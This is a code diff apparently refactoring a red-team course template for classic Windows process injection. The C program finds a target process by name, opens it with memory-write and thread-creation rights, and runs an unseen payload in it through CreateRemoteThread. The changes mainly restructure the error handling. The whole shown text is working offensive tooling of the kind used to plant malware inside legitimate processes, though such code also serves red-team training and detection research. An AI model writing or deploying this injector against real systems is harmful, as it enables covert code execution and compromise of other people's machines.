@@ -1,11 +1,3 @@
-/*
-
- Red Team Operator course code template
- classic code injection
-
- author: reenz0h (twitter: @sektor7net)
-
-*/
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -142,54 +134,51 @@ int inject_proc(HANDLE hProc, unsigned char * payload, unsigned int payload_len)
         NULL                // The thread identifier is not returned
     );
 
-    if (hThread != NULL) {
-        WaitForSingleObject(hThread, 500);
-        CloseHandle(hThread);
-        return 0;
+    if (hThread == NULL) {
+        fprintf(stderr, "[!] CreateRemoteThread() failed (0x%x)\n", GetLastError());
+        return -4;
     }
 
-    return -4;
+    int _result = WaitForSingleObject(hThread, -1);
+    if (_result != 0) {
+        fprintf(stderr, "[!] WaitForSingleObject() failed (0x%x) with code 0x%x\n", GetLastError(), _result);
+        CloseHandle(hThread);        
+        return -5;
+    } 
+    CloseHandle(hThread);
+    return 0;
 }
 
 int main(void) {
     DWORD pid = find_pid(TARGET);
     
-    if (pid) {
-        printf("[i] %s: %d\n", TARGET, pid);
-
-        // Opens an existing local process object.
-        // See: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
-        HANDLE hProc = OpenProcess(
-            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, // Process Access Rights
-            FALSE, // Do not inherit handle     
-            pid    // PID of process to open
-        );
-
-        if (INVALID_HANDLE_VALUE == hProc) {
-            fprintf(stderr, "[!] OpenProcess() failed (0x%x)\n", GetLastError());
-            return -2;
-        }
-        
-        int result = inject_proc(hProc, payload, payload_len);
-        if (result < 0) {
-            fprintf(stderr, "[!] Failed to inject payload\n");
-            CloseHandle(hProc);
-            return -3;
-        }
-        printf("[i] Injection Complete!\n");
-        CloseHandle(hProc);
-        return 0;
-    } else {
+    if (pid == 0) {
         fprintf(stderr, "[!] No %s found\n", TARGET);
         return -1;
     }
-    
-    // if (pid) {
 
-    //     if (hProc != NULL) {
-    //             Inject(hProc, payload, payload_len);
-    //             CloseHandle(hProc);
-    //     }
-    // }
+    printf("[i] %s: %d\n", TARGET, pid);
+
+    // Opens an existing local process object.
+    // See: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
+    HANDLE hProc = OpenProcess(
+        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, // Process Access Rights
+        FALSE, // Do not inherit handle     
+        pid    // PID of process to open
+    );
+
+    if (INVALID_HANDLE_VALUE == hProc) {
+        fprintf(stderr, "[!] OpenProcess() failed (0x%x)\n", GetLastError());
+        return -2;
+    }
+    
+    int result = inject_proc(hProc, payload, payload_len);
+    if (result < 0) {
+        fprintf(stderr, "[!] Failed to inject payload\n");
+        CloseHandle(hProc);
+        return -3;
+    }
+    printf("[i] Injection Complete!\n");
+    CloseHandle(hProc);
     return 0;
 }
